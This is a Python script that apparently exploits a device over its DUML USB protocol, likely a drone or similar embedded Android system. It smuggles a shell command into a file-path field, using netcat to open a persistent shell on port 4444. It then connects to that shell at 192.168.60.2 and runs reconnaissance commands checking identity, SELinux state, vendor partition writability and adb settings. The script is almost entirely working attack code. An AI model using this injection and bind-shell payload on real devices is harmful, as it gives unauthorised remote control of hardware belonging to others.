import os
import sys, time, socket
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import n3_file as N

PATH = 'foo;(while true; do /system/xbin/busybox nc -l -p 4444 -e /system/bin/sh; done 2>/dev/null &)'
pay = bytes([0x01, 0x02, 0x00, len(PATH)]) + PATH.encode() + b'\x00'

d = N.Duml()
d.open()
try:
    d.drain(150)
    f = N.pkt(0x0A, 0x5D, 0x8a00, 0x19, 0x31, pay, 0x40)
    d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 800)
    out = []

    def on(fr):
        b = N.body_of(fr)
        if not b or len(b) < 7:
            return
        if b[5] == 0x19 and b[6] == 0x31:
            out.append((b[4], b[7:]))
    d.drain(1200, on)
    print('spawn reply:', ' | '.join('ack=%02x %s' % (a, p[:20].hex()) for a, p in out) or 'none')
finally:
    d.close()

time.sleep(1.0)
CMDS = r'''id
getenforce
cat /proc/cmdline
mount | grep -E " /vendor | /system "
ls -ld /vendor /vendor/etc /vendor/etc/init 2>&1
touch /vendor/zz_test 2>&1; echo vendor_write_rc=$?; rm -f /vendor/zz_test
getprop service.adb.tcp.port
getprop sys.usb.config
ps -A | grep adbd
cat /proc/net/tcp | head -8
echo END_OF_BATCH
'''
s = socket.create_connection(('192.168.60.2', 4444), timeout=6)
s.settimeout(8)
s.sendall(CMDS.encode())
time.sleep(1.5)
data = b''
try:
    while True:
        chunk = s.recv(8192)
        if not chunk:
            break
        data += chunk
        if b'END_OF_BATCH' in data:
            break
except socket.timeout:
    pass
print(data.decode('utf-8', 'replace')[:4000])
s.close()
